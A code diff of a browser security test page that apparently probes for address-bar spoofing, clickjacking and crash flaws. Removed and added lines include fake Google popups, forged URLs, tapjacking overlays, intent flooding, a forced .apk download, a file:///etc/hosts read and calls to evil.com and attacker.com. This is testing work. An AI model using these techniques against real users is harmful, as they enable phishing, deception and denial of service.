+}
 
-        // ----- TEST 2: POPUP -----
-        function openFakePopup() {
-            const win = window.open('https://www.google.com', '_blank', 'width=400,height=600');
-            if (!win) {
-                log('❌ Popup blocked by browser!');
-                document.getElementById('popupStatus').innerHTML = '❌ Popup Blocked';
-            } else {
-                log('🔴 TEST 2: Popup opened. Check if address bar is spoofable.');
-                document.getElementById('popupStatus').innerHTML = '⚠️ Popup open hai';
-            }
-        }
+function testCORS() {
+    fetch('https://evil.com/api')
+        .then(res => res.text())
+        .then(data => {
+            log('✅ CORS request successful!', 'danger');
+        })
+        .catch(err => {
+            log('❌ CORS blocked: ' + err.message, 'info');
+        });
+}
 
-        function openBlankPopup() {
-            const win = window.open('about:blank', '_blank');
-            if (win) {
-                win.document.write('<html><head><title>Google</title></head><body style="background:#fff; color:#000;"><h1>Fake Google Page</h1><p>Address bar kya dikha raha hai?</p></body></html>');
-                win.document.close();
-                log('🔴 TEST 2: Blank popup with fake content injected.');
-                document.getElementById('popupStatus').innerHTML = '⚠️ Blank popup injected';
-            } else {
-                log('❌ Popup blocked');
-            }
-        }
+// --- CRASH ---
+function crashTest() {
+    log('🔴 Crash test: Creating large data', 'danger');
+    let large = 'A'.repeat(100000000); // 100MB
+    try {
+        const blob = new Blob([large]);
+        const url = URL.createObjectURL(blob);
+        window.open(url);
+        log('⚠️ Large blob opened — watch for crash', 'warning');
+    } catch(e) {
+        log('⚠️ Memory error: ' + e.message, 'warning');
+    }
+}
 
-        function testAuthSpoof() {
-            log('🔴 TEST 2: Attempting HTTP Basic Auth Spoofing...');
-            // Opening in a new tab so we don't lose the test suite
-            window.open('https://google.com\\@example.com:1337', '_blank'); 
-            document.getElementById('popupStatus').innerHTML = '⚠️ Auth URL triggered';
-        }
+// --- OVERLAY ---
+function injectOverlay() {
+    const container = document.getElementById('overlayContainer');
+    const iframe = document.createElement('iframe');
+    iframe.src = 'https://www.google.com';
+    iframe.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.3;pointer-events:auto;z-index:999;';
+    iframe.id = 'overlayIframe';
+    container.innerHTML = '';
+    container.style.position = 'relative';
+    container.appendChild(iframe);
+    log('🔴 Transparent overlay injected — try clicking through it', 'danger');
+}
 
-        // ----- TEST 3: REDIRECT CHAIN -----
-        function startRedirectChain() {
-            log('🔴 TEST 3: Starting redirect simulation...');
-            document.getElementById('redirectStatus').innerHTML = '⏳ Redirecting (Simulated)...';
-            setTimeout(() => {
-                document.getElementById('redirectStatus').innerHTML = '⚠️ Redirect triggered (Local simulation for safety)';
-            }, 500);
-        }
+function removeOverlay() {
+    const container = document.getElementById('overlayContainer');
+    container.innerHTML = '';
+    log('🔄 Overlay removed', 'info');
+}
 
-        function historyPushState() {
-            try {
-                history.pushState({ page: 1 }, 'Fake Google', '/login:1337');
-                log('🔴 TEST 3: history.pushState() called. Check the URL bar!');
-                document.getElementById('redirectStatus').innerHTML = '⚠️ history.pushState() active';
-            } catch(e) {
-                log('❌ history API error: ' + e.message);
-            }
-        }
+function injectClickjack() {
+    const container = document.getElementById('overlayContainer');
+    const btn = document.createElement('button');
+    btn.textContent = '🎯 CLICK ME (hidden under overlay)';
+    btn.style.cssText = 'padding:20px;background:#00ff41;color:#000;font-weight:bold;width:100%;';
+    btn.onclick = () => log('🔥 Button clicked! (Tapjacking successful)', 'danger');
+    container.innerHTML = '';
+    container.style.position = 'relative';
+    container.appendChild(btn);
+    
+    const overlay = document.createElement('iframe');
+    overlay.src = 'https://www.google.com';
+    overlay.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.1;pointer-events:auto;z-index:999;';
+    overlay.id = 'overlayIframe';
+    container.appendChild(overlay);
+    log('🔴 Clickjack overlay injected — click on the green area', 'danger');
+}
 
-        // ----- TEST 4: SANDBOX -----
-        function testPostMessage() {
-            const iframe = document.getElementById('testIframe');
-            try {
-                iframe.contentWindow.postMessage('TEST_DATA', '*');
-                log('🔴 TEST 4: PostMessage sent — watch console for errors');
-                document.getElementById('sandboxStatus').innerHTML = '⚠️ PostMessage sent';
-            } catch(e) {
-                log('✅ PostMessage blocked (SOP working): ' + e.message);
-            }
-        }
+// --- MIXED CONTENT ---
+function injectHTTP() {
+    const iframe = document.createElement('iframe');
+    iframe.src = 'http://example.com';
+    iframe.style.cssText = 'width:100%;height:150px;border:1px solid #333;margin-top:8px;';
+    document.body.appendChild(iframe);
+    log('🔴 HTTP iframe injected on HTTPS page', 'warning');
+}
 
-        function testFetch() {
-            fetch('https://api.github.com/users/octocat')
-                .then(res => res.json())
-                .then(data => {
-                    log('✅ Fetch successful — CORS allowed this.');
-                    document.getElementById('sandboxStatus').innerHTML = '✅ Fetch worked';
-                })
-                .catch(err => {
-                    log('❌ Fetch failed: ' + err.message);
-                });
-        }
-
-        // ----- TEST 5: DEEP LINK -----
-        function fakeDeepLink() {
-            const link = document.createElement('a');
-            link.href = 'arc://settings/fake';
-            link.click();
-            log('🔴 TEST 5: arc:// link triggered');
-            document.getElementById('deepLinkStatus').innerHTML = '⚠️ arc:// link triggered';
-        }
-
-        function fakeIntent() {
-            const link = document.createElement('a');
-            link.href = 'intent://google.com#Intent;action=VIEW;end';
-            link.click();
-            log('🔴 TEST 5: intent:// link triggered');
-            document.getElementById('deepLinkStatus').innerHTML = '⚠️ intent:// link triggered';
-        }
-
-        function aggressiveIntent() {
-            const link = document.createElement('a');
-            link.href = 'intent:#Intent;package=com.android.settings;action=android.settings.SETTINGS;end';
-            link.click();
-            log('🔴 TEST 5: Aggressive Intent (Settings App) triggered!');
-            document.getElementById('deepLinkStatus').innerHTML = '⚠️ Settings intent fired';
-        }
-
-        // ----- TEST 6: UI REDRESS -----
-        function injectOverlay() {
-            const container = document.getElementById('overlayContainer');
-            const iframe = document.createElement('iframe');
-            iframe.src = 'https://www.google.com';
-            iframe.style.cssText = 'position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.3; pointer-events:auto; z-index:999;';
-            iframe.id = 'overlayIframe';
-            container.appendChild(iframe);
-            log('🔴 TEST 6: Transparent overlay injected. Tapjacking possible?');
-            document.getElementById('uiStatus').innerHTML = '⚠️ Overlay active';
-        }
-
-        function removeOverlay() {
-            const overlay = document.getElementById('overlayIframe');
-            if (overlay) overlay.remove();
-            log('🔄 Overlay removed');
-            document.getElementById('uiStatus').innerHTML = '✅ Overlay removed';
-        }
-
-        // ----- TEST 7: FULLSCREEN TRAP -----
-        function triggerFullscreen() {
-            const elem = document.documentElement; // Make whole page fullscreen
-            if (elem.requestFullscreen) {
-                elem.requestFullscreen().then(() => {
-                    document.getElementById('fakeBrowserUI').style.display = 'block';
-                    log('🔴 TEST 7: Fullscreen active. Fake UI shown.');
-                    document.getElementById('fullscreenStatus').innerHTML = '⚠️ Fullscreen Active';
-                }).catch(err => {
-                    log('❌ Fullscreen denied: ' + err.message);
-                });
-            } else if (elem.webkitRequestFullscreen) { /* Safari/Older Chrome */
-                elem.webkitRequestFullscreen();
-                document.getElementById('fakeBrowserUI').style.display = 'block';
-                log('🔴 TEST 7: Fullscreen active (webkit). Fake UI shown.');
-            }
-        }
-
-        function exitFullscreen() {
-            if (document.exitFullscreen) {
-                document.exitFullscreen();
-            } else if (document.webkitExitFullscreen) {
-                document.webkitExitFullscreen();
-            }
-            document.getElementById('fakeBrowserUI').style.display = 'none';
-            log('🔄 Exited Fullscreen');
-            document.getElementById('fullscreenStatus').innerHTML = '✅ Reset';
-        }
-
-        // ----- TEST 8: LOCAL FILE SCHEMES -----
-        function testFileScheme() {
-            log('🔴 TEST 8: Attempting to open file:///etc/hosts ...');
-            const win = window.open('file:///etc/hosts', '_blank');
-            if(!win) log('❌ Blocked file:/// popup');
-            document.getElementById('localFileStatus').innerHTML = '⚠️ Tested file://';
-        }
-
-        function testContentScheme() {
-            log('🔴 TEST 8: Attempting to open content://contacts/people ...');
-            const link = document.createElement('a');
-            link.href = 'content://contacts/people';
-            link.click();
-            document.getElementById('localFileStatus').innerHTML = '⚠️ Tested content://';
-        }
-
-        // ----- TEST 9: WEB SHARE API -----
-        function triggerWebShare() {
-            if (navigator.share) {
-                navigator.share({
-                    title: 'Security Alert',
-                    text: 'Your device is compromised.',
-                    url: 'http://attacker.com:1337/' 
-                }).then(() => {
-                    log('✅ Share API triggered successfully.');
-                    document.getElementById('shareStatus').innerHTML = '⚠️ Share dialog opened';
-                }).catch((error) => {
-                    log('❌ Share failed or cancelled: ' + error);
-                });
-            } else {
-                log('❌ Web Share API not supported on this browser.');
-                document.getElementById('shareStatus').innerHTML = '❌ Not Supported';
-            }
-        }
-
-        // ----- TEST 10: BLOB URI DOWNLOAD -----
-        function triggerBlobDownload() {
-            const data = new Blob(['Spoofed Malware File Content'], { type: 'text/plain' });
-            const url = window.URL.createObjectURL(data);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'update.apk'; // Try forcing an APK extension
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            window.URL.revokeObjectURL(url);
-            log('🔴 TEST 10: Blob download triggered (.apk file). Check browser warnings.');
-            document.getElementById('downloadStatus').innerHTML = '⚠️ Download initiated';
-        }
-
-        // ----- TEST 11: SCHEME FLOODING (DoS) -----
-        let floodInterval;
-        function startSchemeFlood() {
-            log('🔴 TEST 11: Flooding intents... Browser may freeze!');
-            document.getElementById('floodStatus').innerHTML = '⚠️ Flooding... Close tab if frozen!';
-            let count = 0;
-            floodInterval = setInterval(() => {
-                const iframe = document.createElement('iframe');
-                iframe.src = `intent://fake${count++}#Intent;scheme=fake;package=com.fake.app;end`;
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-                if(count > 50) { 
-                    clearInterval(floodInterval); 
-                    log('⏹️ Flood stopped after 50 attempts to prevent full device crash.');
-                }
-            }, 100); // Trigger every 100ms
-        }
-
-        // Initial log
-        window.onload = function() {
-            log('🚀 Test Suite Loaded — All 11 tests ready!');
-            log('💡 Start testing each section and watch the address bar + native UI.');
-        };
-    </script>
+// --- INIT ---
+log('🚀 Test Suite v2.0 Loaded', 'success');
+log('💡 Click each link and WATCH ADDRESS BAR', 'info');
+log('📌 Check for: spoofed domain, file content, app crash, XSS', 'warning');
+</script>
 
 </body>
 </html>
